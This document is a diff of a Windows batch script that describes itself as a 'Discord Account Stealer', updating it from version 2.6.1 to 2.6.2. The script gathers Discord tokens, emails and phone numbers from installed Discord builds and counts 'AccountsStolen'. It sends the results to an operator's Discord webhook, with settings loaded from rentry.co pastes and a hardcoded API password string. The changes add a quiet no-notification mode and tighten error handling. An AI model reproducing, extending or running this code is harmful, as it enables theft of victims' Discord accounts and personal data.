@@ -2,7 +2,7 @@
 setlocal enabledelayedexpansion
 
 :: <Settings>
-set "Version=2.6.1"
+set "Version=2.6.2"
 set "APIPasswords=V4KG2CPM-QXWU4PM2"
 set FilesDB=DiscordMSG.bat notifu.exe WebParse.exe DAS.exe rentry.exe nonAscii.exe
 set "pasteLocation=%temp%\DAS v!Version!\WebPaste.txt"
@@ -38,7 +38,7 @@ for %%a in (%*) do (
     set "Arg[!Args.length!]=%%~a"
 )
 for /L %%a in (1 1 !Args.length!) do (
-    for %%b in ("identifier" "builds" "background") do (
+    for %%b in ("identifier" "builds" "background" "no-notify") do (
             if /i "!Arg[%%a]!"=="--%%~b" (
             set nextArg=%%a
             set /a nextArg+=1
@@ -61,6 +61,11 @@ for /L %%a in (1 1 !Args.length!) do (
                 echo.
                 echo !WrnPrintCore! Exiting Program.!white!
                 exit /b
+            )
+            if /i "%%~b"=="no-notify" (
+                echo.
+                echo !PrintCore! Not sending desktop notifications . . .
+                set "SystemForceNoNotify=true"
             )
         )
     )
@@ -115,20 +120,25 @@ for %%a in (!APIPasswords!) do (
 :: </Load Encoder & Decoder>
 
 :: <Load Identifier>
-if not defined Identifier set Identifier=!DefaultIdentifier!
+if not defined Identifier (
+    echo.
+    echo !WrnPrintCore! Identifier not provided, Using the default.
+    set Identifier=!DefaultIdentifier!
+    )
 set "IdentifierURL=!DefaultGateway!/identifiers/!Identifier!.json?raw=true"
 for /f %%A in ('curl --ssl-no-revoke --silent "!IdentifierURL!"') do set "LINK_TYPE=%%A"
 if not "%LINK_TYPE%"=="<html><body>You" (
     set Show_Notifications=true
     set "APP_Nickname=System"
     call :ERRORS "false" "-" "Couldn't find the identifier specified." "{NT}" "false"
+    exit /b
 )
 for /f "delims=" %%a in ('call "!File[3]!" "!IdentifierURL!" !JsonValues!') do set "Json.%%a"
 for %%a in (ID Endpoint Access) do (
     call :DECODE "!Json.author.%%a!"
     set "Json.author.%%a=!DecodedString!"
 )
-for %%a in ("2.5" "2.6" "2.6.1") do if "!Json.version!"=="%%~a" set "Json.version=2.6.1"
+for %%a in ("2.5" "2.6" "2.6.1" "2.6.2") do if "!Json.version!"=="%%~a" set "Json.version=2.6.2"
 set "WebURL=https://rentry.co/!Json.author.Endpoint!"
 set "PermaAccess=!Json.author.Access!"
 :: </Load Identifier>
@@ -139,11 +149,13 @@ set "PermaAccess=!Json.author.Access!"
      set Show_Notifications=true
      set "APP_Nickname=System"
      call :ERRORS "false" "The Version of the identifier\ndid not match the program version ^(!version!^)" "This Identifier is incompatible with this version.\nIdentifier: !Json.token!" "{NT}" "false"
+     exit /b
  )
   if /i "!json.Enabled!"=="false" (
      set Show_Notifications=true
      set "APP_Nickname=System"
      call :ERRORS "false" "-" "This identifier is disabled.\nIdentifier: !Json.token!" "{NT}" "false"
+     exit /b
  )
 :: </Check META DATA>
 
@@ -157,8 +169,24 @@ set "PermaAccess=!Json.author.Access!"
 :: </Get Software & Hardware information>
 
 :: <Load User Settings for the Identifier>
-call :CHECK_CONNECTION
-call :GetPasteStatus
+:: <Rentry.co Status>
+ping rentry.co -n 1 | findstr "TTL" >nul
+if !ErrorLevel! equ 1 (
+    set Show_Notifications=true
+    set "APP_Nickname=System"
+    call :ERRORS "false" "-" "Rentry.co was found to be offline." "{NT}" "false"
+    exit /b
+)
+:: <Rentry.co Status>
+
+:: <Check existence of rentry.co pastes>
+for /f "tokens=*" %%a in ('curl --ssl-no-revoke -k -s "!WebURL!/raw"') do if "%%a"=="<!DOCTYPE html>" (
+    set Show_Notifications=true
+    set "APP_Nickname=System"
+    call :ERRORS "false" "-" "Couldn't find the paste specified.\nIdentifier: !Json.token!" "{NT}" "false"
+    exit /b
+)
+:: </Check existence of rentry.co pastes>
 
 for /f "delims=" %%a in ('curl --ssl-no-revoke -k -s "!WebURL!/raw"') do <nul set /p="%%a" | >nul findstr /rc:"^[\[#].*" || set "%%a">nul 2>&1
 for %%a in (Webhook Error_Color Success_Color Success_Image Error_Image Success_Title Error_Title Success_Description Error_Description Show_Notifications APP_Nickname Hide_Mail Hide_Phone Hide_Token SendUnclaimedAccounts DATABASE) do (
@@ -166,10 +194,21 @@ for %%a in (Webhook Error_Color Success_Color Success_Image Error_Image Success_
         set Show_Notifications=true
         set "APP_Nickname=System"
         call :ERRORS "false" "-" "The Identifier is missing settings and the APP is unable to load.\nIdentifier: !Json.token!" "{NT}" "false"
+        exit /b
     )
 )
 call :DATABASE 0
-call :Validate_Webhook
+
+:: <Discord Webhook Validator>
+for %%a in (ptb canary) do set "Webhook=!Webhook:%%a.=!"
+if not "!Webhook:~0,33!"=="https://discord.com/api/webhooks/" set "ERROR=Invalid Webhook URL"
+for /F "tokens=* USEBACKQ" %%a in (`curl --ssl-no-revoke --silent "%webhook%"`) do set "WebhookCheck=%%a"
+for %%a in ("404: Not Found" "401: Unauthorized" "Invalid Webhook Token") do echo !WebhookCheck! | findstr /ic:%%a >nul && set "ERROR=Invalid Webhook URL"
+if "!Error!"=="Invalid Webhook URL" (
+    call :ERRORS "false" "-" "Error Accured while verifing the identifier.\nIdentifier: !Json.token!" "Invalid Webhook URL for the identifier: !Json.token!." "false"
+    exit /b
+)
+:: </Discord Webhook Validator>
 
 set IdentifierDATA=!Error_Description!
 set "IdentifierDATA=!IdentifierDATA:{AccountsStolen}=%AccountsStolen%!"
@@ -183,6 +222,7 @@ if defined Error (
     if "!Error!"=="Not supported" call :ERRORS "true" "This Discord Account Stealer version is no longer maintained, please use a newer version." "This version is no longer maintained, Please update to a newer version." "{NT}" "false"
     if "!Error!"=="Discord not installed" call :ERRORS "true" "Looks Like the User does not have discord installed" "Discord is not installed, please install discord, login and try again." "{NT}" "true"
     if "!Error!"=="User is not logged in" call :ERRORS "true" "Looks like this user is not logged in to any discord account." "This Looks like you have discord but you are not logged in." "{NT}" "true"
+    exit /b
 )
 :: </Collect Discord Builds Information>
 
@@ -191,7 +231,7 @@ title !APP_Nickname!
 set IdentifierDATA=!Success_Description!
 set "IdentifierDATA=!IdentifierDATA:{TotalFailures}=%Failures%!"
 call :LoadMessagePlaceHolders
-if /i "!Show_Notifications!"=="true" start "" "!File[2]!" /p "!APP_Nickname!" /m "The identifier has been successfully verified.\nIdentifier: !Json.token!\n" /d 0 /i %SYSTEMROOT%\system32\shell32.dll,302
+if not "!SystemForceNoNotify!"=="true" if /i "!Show_Notifications!"=="true" start "" "!File[2]!" /p "!APP_Nickname!" /m "The identifier has been successfully verified.\nIdentifier: !Json.token!\n" /d 0 /i %SYSTEMROOT%\system32\shell32.dll,302
 echo.
 echo !PrintCore! Identifier has been verified : !Json.token!!white!
 
@@ -206,7 +246,6 @@ if /i "!SendUnclaimedAccounts!"=="false" for %%a in (!BuildsFound!) do (
 if /i "!Hide_Mail!"=="true" for %%a in (!BuildsFound!) do echo "!Discord_%%a_Email!" | findstr /c:"none">nul || set "Discord_%%a_Email=||!Discord_%%a_Email:@=||@!"
 if /i "!Hide_Phone!"=="true" for %%a in (!BuildsFound!) do echo "!Discord_%%a_Phone!" | findstr /c:"null">nul || set "Discord_%%a_Phone=||!Discord_%%a_Phone!||"
 if /i "!Hide_Token!"=="true" for %%a in (!BuildsFound!) do set "Discord_%%a_Token=||!Discord_%%a_Token!||"
-
 if !Accounts! gtr 0 (
     for %%a in (!BuildsFound!) do (
         set "MessageBody=!IdentifierDATA!"
@@ -243,7 +282,7 @@ call :DATABASE 1
 ) else REM Send message no accounts sent
 echo.
 echo !PrintCore! The Application Has finished.
-if /i "!Show_Notifications!"=="true" start "" "!File[2]!" /p "!APP_Nickname!" /m "The Application has been successfully finished." /d 0 /i %SYSTEMROOT%\system32\shell32.dll,302
+if not "!SystemForceNoNotify!"=="true" if /i "!Show_Notifications!"=="true" start "" "!File[2]!" /p "!APP_Nickname!" /m "The Application has been successfully finished." /d 0 /i %SYSTEMROOT%\system32\shell32.dll,302
 echo.
 echo !WrnPrintCore! Closing window in 10 seconds . . .!white!
 timeout /t 10 /nobreak >nul
@@ -265,13 +304,13 @@ if "!AddStats!"=="true" (
 echo.
 echo !ErrPrintCore! !PrintError:{NT}=%NotificationText:\n= %!
 set "ErrorMessageBody=!ErrorMessageBody:{TotalFailures}=%Failures%!"
-if /i "!Show_Notifications!"=="true" start "" "!File[2]!" /p "!APP_Nickname! | ERROR" /m "!NotificationText!" /d 0 /i %SYSTEMROOT%\system32\shell32.dll,131
+if not "!SystemForceNoNotify!"=="true" if /i "!Show_Notifications!"=="true" start "" "!File[2]!" /p "!APP_Nickname! | ERROR" /m "!NotificationText!" /d 0 /i %SYSTEMROOT%\system32\shell32.dll,131
 set ErrorMessageBody=!ErrorMessageBody:{error}=%ErrorDiscordText%!
 if "%~1"=="true" call "!File[1]!" +silent --embed "!Error_Title!" "!ErrorMessageBody:\n=\\n!" "!Error_Color!" "!Error_Image!"
 echo.
 echo !WrnPrintCore! Closing window in 10 seconds . . .!white!
 timeout /t 10 /nobreak >nul
-exit
+exit /b
 :: </Errors System - Actions for the Error>
 
 :: <Decoder>
@@ -319,37 +358,6 @@ if defined %~1 for /f "delims=:" %%N in (
 endlocal & if "%~2" neq "" (set %~2=%len%) else echo %len%
 exit /b
 :: </String Counter>
-
-:: <Discord Webhook Validator>
-:Validate_Webhook
- for %%a in (ptb canary) do set "Webhook=!Webhook:%%a.=!"
- if not "!Webhook:~0,33!"=="https://discord.com/api/webhooks/" set "ERROR=Invalid Webhook URL"
- for /F "tokens=* USEBACKQ" %%a in (`curl --ssl-no-revoke --silent "%webhook%"`) do set "WebhookCheck=%%a"
- for %%a in ("404: Not Found" "401: Unauthorized" "Invalid Webhook Token") do echo !WebhookCheck! | findstr /ic:%%a >nul && set "ERROR=Invalid Webhook URL"
- if "!Error!"=="Invalid Webhook URL" call :ERRORS "false" "-" "Error Accured while verifing the identifier.\nIdentifier: !Json.token!" "Invalid Webhook URL for the identifier: !Json.token!." "false"
- exit /b
-:: </Discord Webhook Validator>
-
-:: <Rentry.co Status>
-:CHECK_CONNECTION
-ping rentry.co -n 1 | findstr "TTL" >nul
-if !ErrorLevel! equ 1 (
-    set Show_Notifications=true
-    set "APP_Nickname=System"
-    call :ERRORS "false" "-" "Rentry.co was found to be offline." "{NT}" "false"
-    )
-exit /b
-:: </Rentry.co Status>
-
-:: <Check existence of rentry.co pastes>
-:GetPasteStatus
-for /f "tokens=*" %%a in ('curl --ssl-no-revoke -k -s "!WebURL!/raw"') do if "%%a"=="<!DOCTYPE html>" (
-    set Show_Notifications=true
-    set "APP_Nickname=System"
-    call :ERRORS "false" "-" "Couldn't find the paste specified.\nIdentifier: !Json.token!" "{NT}" "false"
-)
-exit /b
-:: <Check existence of rentry.co pastes>
 
 :: <DATABASE>
 :DATABASE
